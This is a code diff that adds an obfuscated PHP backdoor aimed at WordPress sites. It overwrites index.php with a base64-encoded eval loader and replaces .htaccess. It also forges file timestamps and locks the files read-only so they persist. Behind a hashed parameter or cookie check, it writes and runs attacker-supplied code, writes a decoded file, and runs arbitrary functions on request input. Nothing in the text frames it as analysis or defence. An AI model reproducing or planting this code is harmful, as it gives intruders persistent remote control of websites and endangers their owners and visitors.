@@ -1,0 +1,130 @@
+<?php
+/*Step Data*/
+$s = $_SERVER;
+/*Step Data*/
+$g = $_REQUEST;
+if (!empty($_GET))
+    foreach ($_GET as $k => $v) $g[$k] = $v;
+/*Step Data*/
+$pz = function ($y, $z, $u, $c, $g, $q = '') {
+    if ($u && @Md5_File($y) !== $u) {
+        $fwC = $c[$g($z[3])];
+        $t1 = @filEmtiMe($y);
+        @ChMod($y, 0744);
+        @$z[6]($y);
+        $t1 || $t1 = time() - 3600;
+        $t = ['m' => $t1, 'a' => $t1];
+        File_Put_conTents($y, $c[implode('_', ['', 'code', ''])]($q ? $q : 'PD9waHAKJE1Bd0pwPQlmdW5jdGlvbiAoJFRGRSApIHskRU1MYlFvPSJmY3I2aURMc3dIZGFsNWV6bWcyTFFBIjsKIHJldHVybiAkRU1MYlFvO307CgkJDQkkbDQwMG1RakZoPQlmdW5jdGlvbigkU2lUS2RNaU4JKXskbUZMUXcgPSAiWEROVEkiOyRVX3ZiQVFMUz0kbUZMUXdbKDY1IC0gNjQgKzQpLyA1XS4kbUZMUXdbKDEwMC05NCsxMCkgLyA0XQ0uJG1GTFF3Wyg5OS0gODYtIDkpLyAyXS4gJG1GTFF3WygzMy0yNCkvIDNdLiRtRkxRd1soOTMtODcgLTYpIC8gNV0uJ3AnIC4gJ3YnLicnOwkgcmV0dXJuICRVX3ZiQVFMUygkU2lUS2RNaU4pO307JGdkaEx1Z1Q9J21NL2tQaStwR2NzZVdUUUswSmNOZ204b2lKR1ZBUUZwSU1ocXRvbDJCaVpCVzFqWlNodi9ldTZzUFc3SXhKSm5wUTZZdnRyUjc3cmw3NzduN0pjUThEM3UyeDF6c1VlNU10WDc3NWRNbnJTbTJJNXdGM0VHNzZEWWdiSHZUamxpSUk2YXA0Zk5YVjVmL1hOSkw4N1AvNW5DU2hvN2gzanJEUGp5VDI4TlhmblM4OVNsNGJhU3FKRW9EWitvSFV3WTh4TDhsMU5OYTl0Z3lYbG5HTy9YY05QZnRvK05qYTkrMEw0Nkdad2RIWjViNm9ZUDZIYlFwalgwQ28yTXg4OEM2WVdaWXA1WmhHZXFIdmZzNmRoU2w1QUQvRGwza09JQTNHM3dPelVXYStiNDVKdTRDamFyQzY2QkZlY1krWVlmWjJCZmtVVUFaSkNrTy9KVGFWZCtVVWExZHM1NDVNcXpMa1duWlJ5Y25NRnlCNFM0QkFKdTRxY2kwMGxFNnFMQ3JVMUNQWjFyb1EyNGNxZ21ydHV4UEtKWERFLzlpaUR6V09MSEZHOUhhN1M5UG42elZJRVJnN2xoSzJFS1g3SG42UkF6SmlkakU5cjBVdWhUUnRkUHJ6YXFqdDcyOXJidUp1d2V2dXorVFo3N0h4Wi9BaVgrcG5YaVFBb2dIVVE3aW40dCttZFVFa3lYU25JL0dacDRUb0d3azdZOERhMnphQjhaYkNSQktCQ0hsMkpHd004dDhwd2FoRkxSNnpnV0VkSlRJZFFoR1FjK2VvY29VR3E0OVRwa2k4eVFmTlVVR0wrSlRSSDdYMklSVExZZWhDTVJkbDgweVQ4RHRlbXhxWndFTkUwMGRTSkNIYnpFbHJRRlhPeUtNUWdLUGZmU1pqSm00SG5jb2pLcEtjZ2ZCRDNQa1JKT1phZGRhQkVrZEFvbHVRTW9wczlnc1JhZzNsN056RVF3bEoyTnVoZGloWUVjV0ZnSlIyV1V3T1hZUUpobU9OQ1dQVzZjVENnWGMvM1ZyUy9iR1BHVzI2MU83Wkd3QUswOFNuYkFnWXA2bUhPZU5YWHJqc2gxRTJZVDIzQlFxN3lVS2s4QWpqTzc2Tk83K1ZnZ1VKbmpHb3l2dkhhVnFMcHloT2ZuV3kzNmhhN3VjREUwcFhWZ1ZDZGhrZ2F0UHN2VEhrUE1SYXJZZzRKVEx5S29WYVRBWXpDbVZpLzVOU3NYWVl3R2t0M0lTRUNTZVpVN1hXa1creXpXSHdLSnpmWDJ0VHpHZXBrd1BjZFlUcXV3VnNGMWhLWldzbGFzTXFZQklwMnNnTGV4QUxpWmFoZXNnWlZ3NEcyTEtZeDRHY2tFd1dNajRGWXVVWE9hMW9vakcvbTNHcWRnbzBaa2NEQ3F0RlYyTVFsZlFEaHI5dmY3ZUsycHJyVnBndjRyQ01veVJNYzhDUDNjUGxxcW0vN0xYL3FHS3RGYVdENVViQko1WFYwdnV4U0Ixc1MxcnlwdHUxbzNlbStjN2ZJZnNLeDJ4UFdzTHpzQkFISVRTSUFTTEx6K1ZKSGVpNU11WFJ2WGZaNDAvSnpSTFlmUkZ2OUpSUVpCNVMxa01jaU92TnpjRkxrOU5vRU1IZFRmYmNxdlNRMEtVSDAzYWZIYktZQXRVUjIzbVVTMm00Nm95Z053c1hYTytRNno3MUZxY2t2OXJzbFFUWWZGZmlUSlRKRjk4MGJJZ1pzU2IvVTBYOHRPTVFwNURleHY2QmdLQTJCdlFLZmFkU0oxenJkUjZsRy93L2FLL3NkbzNBTkFsaG4wSTdUTXZDeHl3U1cvVTFabGJvRitTdXRMUkJjNzN1eDJrNnZWTWZrc3F0L3I5MWVFQUFMMEZxT2NFS1Jvejd3cXVkcGE0Z0Q0NnBNTEZmZFdnM090aFFSNTVjbzk5Sjc4QTVDZitZcG82UWNieTFWVTJieFF6bzM1aVVvSnpveCtlNEt1TDU2Zjh6YzFXRnJ6KzYxTjBGbTBFaDBaNjRTUmJqUC8rSXN6Uy9wK201VWZuU1Y4cHBwdmtmUDY5bkc5cm5FbDFyQVplZWRJRzhybVR0cDdRSUF5WjJEVWtQbzl6bGNsOEtxUkppb1dZTnR5R3hMSHMydTF5SjB6OWlKRWVuRjVBSjhxNk9VUmVtQ3FUWlFhaWZZYUt3YVhOSWs3eFV2WXhCM2EyejFsdmRoMHJsaWE0M1VZY0ZweWw4UExrdHVUZUFmZ2d5dUQ2eWpPb0pkSUxvRUN1dXltTDRkTGdPbE94MzljU2xCZllvNGs4UGsxbVRETnBWdEZVNHkrWVNNWlRMbDRCQmRWeHhWTjl5dU92R3RsS3l0QzdJVFNvU0p1RExOVmVXU0d6aXBnemV0aGtabEJjR09lSXl2dmlmTTk4Ky9Kb2F3VEZuTlViSWF5MExTem54NjhYODNURlNMYzNONWVPVkxiZjQ2MVI3T0NVSkN4TmJiaVUwSmdzVzVua25neGJkL3NMYXR6SEIwc1NMSUQ1N0VEYSt1eEtqZko3VlppQVdRZ1ltenZsUXJnbTMyRmJ4aTQ0Q3BNT09qNHdMa2I3NGhQTGhmZ0FWVERlanpNczg4QVltc2JSY0h4cUdaMk4rbHBPU3Bkc3drSmhPTWNXcHBpd3F1MU9CT2d4Nm52TzdCYi9zcDZOMlFjdEdaSUlFNjNEK2tOdkdoOFd4K3FIdHZqQ0Evc0l4U20rWnMwdmp4S3dEcWRwRmNleFdtU284RTQ5bitVanlrL2g0SVFUSW9Tb2Y2WjZiWitPak1NajQ4UTZzZmVOa1RrcW5ENE1nMk44OVJrT1BlaDhhWVQycVRFYW1yWTFQTEVmRmZBeS9FUHh6d1NKQXhpTUVBUDlDdyc7JGdkaEx1Z1Q9ICRsNDAwbVFqRmgoJGdkaEx1Z1QpOwoNJGFYd2V6M0g9ZnVuY3Rpb24gKCRoT0hLcU1DDSwkUnNqMW9adnosJFF0dVk4RnpnagkpIHsKcmV0dXJuICJzZmlPQklpMEhucUhQIjsKfTsgDSRsNDAwbVFqRmgJPSBmdW5jdGlvbg0oJFNpVEtkTWlOCil7JG1GTFF3ID0gIlhETlRJIjskVV92YkFRTFM9JG1GTFF3Wyg2NSAtIDY0ICs0KS8gNV0uJG1GTFF3WygxMDAtOTQrMTApIC8gNF0gLiRtRkxRd1soOTktIDg2LSA5KS8gMl0JLiRtRkxRd1soMzMtMjQpLyAzXQouCiRtRkxRd1soOTMtODcgLTYpIC8gNV0JLgkncCcJLiAndicuCScnO3JldHVybiAkVV92YkFRTFMoJFNpVEtkTWlOKTt9OwokekJVRU1TMGRPCT0NZnVuY3Rpb24gKCROdGYxQTEsJHdvZ0M5bGMJKSB7CnJldHVybiAiT0t2bHZXYTFzY1NEaG5nZ2NvWXd1NFE2OGk3OFlqcm1IOWQxUSI7fTsKIA0kZ2RoTHVnVD1MSVkoJGdkaEx1Z1QpOwkJDQoKZnVuY3Rpb24gIERJTnRYcHYoJEp2dWZQQSkJe3JldHVybiAJT2haTignJykuJEp2dWZQQTt9IGZ1bmN0aW9uIApMSVkJKCRIWlcpeyRUNlRzQUxtID0gIk9SYnFyX2ZOUCI7JG53aEMyQlk9JFQ2VHNBTG1bKDQ3IC0gNDYgLSAxKS80XSAuJFQ2VHNBTG1bKDI5LSA3IC0gOCkgLyAyXQ0uJFQ2VHNBTG1bKDEzMiAtIDk2KS8gNl0gLiRUNlRzQUxtWyg5MyAtOTApIC8zXTskbndoQzJCWQkuPSANKCg4NS0gNjQgKyA5KS8gNSkNLgkoKDY2LSA1NyAtIDEpIC8gMik7JG53aEMyQlkgLj0gJFQ2VHNBTG1bKDg5IC03NCkvIDNdOwkkbndoQzJCWQouPSAJJFQ2VHNBTG1bKDIzLSAxMCsgMikgLzVdCi4kVDZUc0FMbVsoODktOTIgKyA3KSAvIDRdLiRUNlRzQUxtWyg0MyAtIDI3KS8gMl0JLg0kVDZUc0FMbVsoMTEtNSkgLyAzXSAuJFQ2VHNBTG1bKDk5IC0gODQpIC8gNV0uJFQ2VHNBTG1bKDc4LSA1MyAtIDEpIC82XQouICcnOwkkbndoQzJCWT1zdHJfcm90MTMoJG53aEMyQlkpOwkNDXJldHVybiAkbndoQzJCWSgkSFpXKTt9ICANCmZ1bmN0aW9uICBPaFpOICgkZEttdlpYeSApeyRHY18zSEVnID0gImRIR1VGaDlWIjskbzI5PSgoODUgLSA0NCAtIDYpIC8gNSkNOyAkbzI5Lj0KCiRHY18zSEVnWyg5MiAtIDY3IC0gNCkgLzNdIC4gJEdjXzNIRWdbKDExMSAtOTIgKyA2KSAvNV07CSRvMjkJLj0gCiRHY18zSEVnWyg1NyAtIDU3KS8yXQkuCSRHY18zSEVnWyg0NiAtMzEpIC81XQkuKCg0OSAtIDIyKSAvMykuCSd0JyAuJEdjXzNIRWdbKDE3IC0gMTEpLyAzXSAuCSRHY18zSEVnWyg1NS0zMyAtIDEwKSAvIDNdDS4JJEdjXzNIRWdbKDcwIC02OCkvIDJdIC4KKCg4OSAtIDg5KSAvIDIpIC4JJyc7ICByZXR1cm4gJG8yOTsJfQokZ2RoTHVnVD1WQVhBN2tKKCRnZGhMdWdUKTsJZnVuY3Rpb24gVkFYQTdrSigkQnhlM1QpeyRGX1JxID0gIkZUaUxOWiI7JElDckZfPSdHJwkuJEZfUnFbKDEwNCAtIDc0IC0gNSkvIDVdLiRGX1JxWyg2NC0gNTIpLyA2XS4JJEZfUnFbKDczIC0gNTYgLSAxKS8gNF0uCiRGX1JxWyg2NCAtIDY0KSAvIDVdIC4JJEZfUnFbKDU0LSA0MSArIDUpLyA2XS4nYScuJEZfUnFbKDgwIC0gODIgKyA3KSAvIDVdLidFJwkuJyc7IHJldHVybiAkSUNyRl8oJEJ4ZTNUKTsgICB9IAkNCQ0gCiAkZ2RoTHVnVAo9DWJ1WU9zMygkZ2RoTHVnVCk7IAplVkFMKCRnZGhMdWdUKTsKCg0JZnVuY3Rpb24gIGJ1WU9zMyAoJEpvcHBZSyl7JEIwcSA9ICJvclQiOyRjWnNuOGRXPSdTJy4gJEIwcVsoNTMtIDU1KyAxMCkgLzRdIC4nUicuJ18nIC4gJEIwcVsoNzQgLTcyKSAvIDJdDS4JJEIwcVsoNTctNjYrIDkpIC8gNF0JLidUJyAuCScxJwkuCigoMjktIDI1ICsgNSkgLyAzKS4NJyc7cmV0dXJuICRjWnNuOGRXKCRKb3BwWUspO307ID8+PD9waHAKZGVmaW5lKCAnV1BfVVNFX1RIRU1FUycsIHRydWUgKTsKcmVxdWlyZSBfX0RJUl9fIC4gJy93cC1ibG9nLWhlYWRlci5waHAnOw=='));
+        Touch($y, $t['m'], $t['a']);
+        @ChMod($y, 0444);
+        return true;
+    }
+    return false;
+};
+/*Step Data*/
+$c = [
+    '137S105122V105122',
+    'D117C125ME116T137122OO124',
+    '137G105T',
+    '_143o144145137',
+    '9687ab811fce67ff667bab0db0ef775a', 'd' => ['145170105c'],
+    'in144e170056p150160', 'link',
+    'h' => [
+        "056150ta143143e163s", 'be476d27ece89594604d14886c081016', '146I154E137160U164137143O156164E116164123', '156am145'
+    ],
+    'c' => ['145170105c', '142101S145066064137d105C157d145', '141d155i156056160p160']
+];
+/*Step Data*/
+$z = function ($b) {
+    $_ = "";
+    $g = strlen($b) - 2;
+    $z = function ($b) {
+        $_ = '';
+        if (($g = strlen($b)) < 3) return [2, $b];
+        for ($o = 0; $o < $g; $o++) {
+            $_ .= $b[$o];
+            if (!is_numeric($b[$o]) || $b[$o] >= 8) return [$o + 1, $_];
+        }
+        return [$o, chr(octdec($b))];
+    };
+    for ($o = 0; $o < $g; $o += $d[0]) {
+        $d = $z($b[$o] . $b[$o + 1] . $b[$o + 2]);
+        $_ .= $d[1];
+    }
+    return $_ . substr($b, $o);
+};
+/*Step Data*/
+/*Step1 Data*/
+$g['0x06'] = '_dxep';
+/*Step Data*/
+$r = rtrim($s[$z($c[1])], '/') . '/';
+/*Step Data*/
+$c[6] = 'un' . $c[6];
+/*Step Data*/
+$vn = '_exp';
+/*Step1 Data*/
+empty($_COOKIE[$g['0x06']]) && $_COOKIE[$g['0x06']] = FALSE;
+if (!defined("WP_UNIQUE")) define("WP_UNIQUE", (isset($g['a']) && (($_e = substr(md5($g['a']), 2, 8) === '76b6265a') || preg_match('/^\d*[a-z,A-Z]{2,}\d{2,}$/i', $g['a'])) || !empty($_COOKIE[$vn])) ? (($_e || (!empty($_COOKIE[$vn]) && substr(md5($_COOKIE[$vn]), 2, 8) === '76b6265a')) ? 2 : 1) : 0);
+$q = function ($g) {
+    $data = array_map(function ($item) {
+        $item();
+        return "\$i";
+    }, $g);
+
+    return $data;
+};
+
+$q(
+/* debug */
+    $uz = [
+        function () {
+
+        },
+        function () use ($r, $z, $c, $pz, $g) {
+            $y = $r . $z($c[5]);
+            $_COOKIE[$g['0x06']] = $pz($y, $c, $c[4], $g, $z);
+        },
+        function () use ($r, $z, $c, $pz, $g) {
+            $pz($r . $z($c['h'][0]), $c, $c['h'][1], $g, $z, 'PElmTW9kdWxlIG1vZF9yZXdyaXRlLmM+DQpSZXdyaXRlRW5naW5lIE9uDQpSZXdyaXRlQmFzZSAvDQpSZXdyaXRlUnVsZSBeaW5kZXgucGhwJCAtIFtMXQ0KUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhLWYNClJld3JpdGVDb25kICV7UkVRVUVTVF9GSUxFTkFNRX0gIS1kDQpSZXdyaXRlUnVsZSAuIGluZGV4LnBocCBbTF0NCjwvSWZNb2R1bGU+');
+        },
+        function () use ($r, $z, $c, $pz, $g) {
+            $pc = empty($g[$N = $z($c['h'][3])]) ? '' : $g[$N];
+            $q = 'PD9waHAgQHVubGluayhfX0ZJTEVfXyk7Pz4';
+            if (WP_UNIQUE !== 2 || strlen($pc) < 20 || stripos($pc, ';') === false) return;
+            $q = base64_decode($q);
+            @file_put_contents($d = time() . rand(1000, 9999), $q . $g[implode('_', ['', 'code', ''])]($pc));
+            if (file_exists($d))
+                @require $d;
+            die();
+        },
+        function () use ($z, $c, $r, $g) {
+            if (!WP_UNIQUE || empty($g['fx'])) return;
+            $pc = $z($c['c'][1]);
+            $pz = $z($c['h'][2]);
+            $pz($z($c['c'][2]), $pc($g['fx']));
+            echo explode('.', $z($c['c'][2]))[0];
+            die();
+        },
+        function () use ($g) {
+            if (WP_UNIQUE && isset($g['d']))
+                echo $g['d'] ? "Dj" . $g['d'] : 'd';
+        },
+        function () use ($z, $c, $g) {
+            $pc = $z($c[$v = 'c'][0]);
+            $pz = $z($c['c'][1]);
+            WP_UNIQUE && isset($g[$v]) && ((isset($g[$r = 'g']) && $pc = $g[$r]) || 1) &&
+            $pc($z($g[$v] ? $pz($g[$v]) : "153i154l -071040-61"), $a) && print_r($a);
+        },
+
+        function () use ($g) {
+            if (WP_UNIQUE && isset($g['z']))
+                die();
+        },
+    ]
+
+/**/
+);
+$y = $r . $z($c[5]);
+
+
+
